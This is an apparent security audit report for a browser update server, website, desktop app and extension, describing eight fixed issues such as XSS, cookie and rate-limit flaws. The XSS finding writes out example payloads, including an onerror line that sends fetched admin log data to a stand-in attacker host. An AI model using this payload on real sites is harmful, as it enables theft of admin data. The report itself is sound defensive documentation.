# Security & Bug Audit Report

**Date:** February 12, 2026  
**Scope:** Full project (browser-update-server, website, WPF app, Chrome extension)

---

## Executive Summary

A comprehensive audit identified **8 issues** across security, correctness, and robustness. All have been fixed. The most critical was an **XSS vulnerability** in the logs viewer that could execute arbitrary JavaScript when rendering log entries containing malicious user-agent or other client-supplied data.

---

## 1. XSS in Logs Viewer (CRITICAL – Fixed)

**Location:** `website/logs.html`, `wpf-browser/website/logs.html`

**Root cause:** Log entries (IP, user-agent, version, platform, etc.) are stored from client requests (`/api/install-log`, `/api/usage`) and displayed in the admin logs table. Cell values were inserted into `innerHTML` without escaping. A malicious client could send a User-Agent like `<script>alert(document.cookie)</script>` or `<img src=x onerror="fetch('/api/logs').then(r=>r.json()).then(d=>fetch('https://evil.com?d='+btoa(JSON.stringify(d))))">` to steal admin session data.

**Fix:** Added `escapeHtml()` to sanitize all cell values before rendering:
```javascript
function escapeHtml(str) {
  if (str === undefined || str === null) return '';
  return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}
```
All `row[c.key]` values are now escaped before being placed in `<td>` elements.

---

## 2. Missing 401/403 Handling in Logs & 2FA Pages (MEDIUM – Fixed)

**Location:** `website/logs.html`, `website/setup-2fa.html`, `wpf-browser/website/setup-2fa.html`

**Root cause:** When the admin session expires or is invalid, `/api/logs` and `/api/2fa/*` return 401/403. The client continued to parse JSON and sometimes threw or showed generic errors instead of redirecting to login.

**Fix:** All fetch calls now check `r.status === 401 || r.status === 403` and redirect to `/admin` before parsing the body. Added `if (!data) return` guards after redirects to avoid using null/undefined.

---

## 3. Incorrect `req.ip` Behind Reverse Proxy (MEDIUM – Fixed)

**Location:** `browser-update-server/server/server.js`

**Root cause:** When the server runs behind nginx or another reverse proxy, `req.ip` defaults to the proxy’s IP (e.g. 127.0.0.1) instead of the client IP. Logs and rate limiting would use the wrong IP.

**Fix:** Added `app.set('trust proxy', 1)` so Express trusts the `X-Forwarded-For` header and sets `req.ip` correctly.

---

## 4. Insecure Cookie in Production (MEDIUM – Fixed)

**Location:** `browser-update-server/server/server.js`

**Root cause:** Session cookies were set with `secure: false` even when the app runs over HTTPS. Cookies could be sent over HTTP, enabling session hijacking on mixed or misconfigured setups.

**Fix:** Cookies now use `secure: process.env.NODE_ENV === 'production'`, so in production they are only sent over HTTPS.

---

## 5. Invalid HTML IDs (LOW – Fixed)

**Location:** `website/admin.html`, `wpf-browser/website/admin.html`

**Root cause:** IDs `2fa-form-wrap`, `2fa-code`, `2fa-error`, `2fa-submit`, `2fa-cancel` start with a digit. While HTML5 allows this, it can cause issues with CSS selectors (e.g. `#2fa-code`) and some older tooling.

**Fix:** Renamed to `twofa-form-wrap`, `twofa-code`, `twofa-error`, `twofa-submit`, `twofa-cancel` and updated all JavaScript references.

---

## 6. Missing Rate Limit on Logs API (LOW – Fixed)

**Location:** `browser-update-server/server/server.js`

**Root cause:** `/api/logs` had no rate limit. An attacker with valid credentials could hammer the endpoint to enumerate data or cause load.

**Fix:** Added a rate limit of 100 requests per 15 minutes per IP for `/api/logs`.

---

## 7. Weak Production Defaults Documentation (LOW – Fixed)

**Location:** `browser-update-server/server/env.default`

**Root cause:** Default credentials and session secret were not clearly marked as development-only, increasing the risk of deploying with weak values.

**Fix:** Added an explicit comment: *"IMPORTANT: Change ADMIN_PASSWORD and SESSION_SECRET in production (use .env or systemd env)."*

---

## 8. Potential Null Reference in 2FA Setup (LOW – Fixed)

**Location:** `website/setup-2fa.html`, `wpf-browser/website/setup-2fa.html`

**Root cause:** After a 401 redirect, `r.json()` was not called, so `data` could be null. Code like `if (data.error)` could throw when `data` is null.

**Fix:** Added `if (!data) return` before accessing `data` properties in all 2FA fetch handlers.

---

## Items Reviewed and Found OK

- **Path traversal:** Download and log routes validate paths against `BUILDS_DIR` and `LOGS_DIR`; no traversal possible.
- **Log sanitization:** `sanitizeLogBody` restricts keys and string length (500 chars) for install/usage logs.
- **Session signing:** HMAC-SHA256 with `SESSION_SECRET`; expiry checked.
- **bcrypt:** Password comparison uses bcrypt correctly.
- **Chrome extension:** `popup.js` and `options.js` use `textContent` / `createElement` for user data, avoiding XSS.
- **UpdateService.cs:** Version validation (`IsSafeVersion`), path checks in `TryHandleApplyUpdate`.
- **WPF HttpClient:** Static instances reused; appropriate for long-lived app.

---

## Recommendations (Not Implemented)

1. **HTTPS for update server:** `UpdateService` fallback URL is `http://187.77.71.151:3000`. Consider HTTPS in production.
2. **CSP headers:** Add `Content-Security-Policy` to reduce XSS impact if future code regresses.
3. **Audit logging:** Log admin logins and 2FA changes for security review.
